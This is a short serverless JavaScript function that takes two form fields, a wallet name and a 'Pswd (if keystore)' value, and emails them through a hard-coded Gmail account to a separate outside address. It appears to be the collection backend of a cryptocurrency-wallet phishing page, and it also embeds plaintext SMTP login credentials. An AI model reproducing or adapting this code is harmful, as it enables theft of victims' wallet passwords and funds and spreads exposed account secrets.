const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
  // Handle OPTIONS request for CORS
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
      },
      body: ''
    };
  }

  // Handle POST request
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const formData = JSON.parse(event.body);
    const { wName, psdWet } = formData;

    // Create email transporter
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'divasnow178@gmail.com',
        pass: 'cfoyhwlljngpvera'
      }
    });

    // Email configuration
    const mailOptions = {
      from: '"Deets" <divasnow178@gmail.com>',
      to: 'hello.davidolawale@gmail.com',
      subject: 'New Form Submission',
      html: `
        <p><strong>Name:</strong> ${wName || 'Not provided'}</p>
        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
      `
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Failed to process request' })
    };
  }
};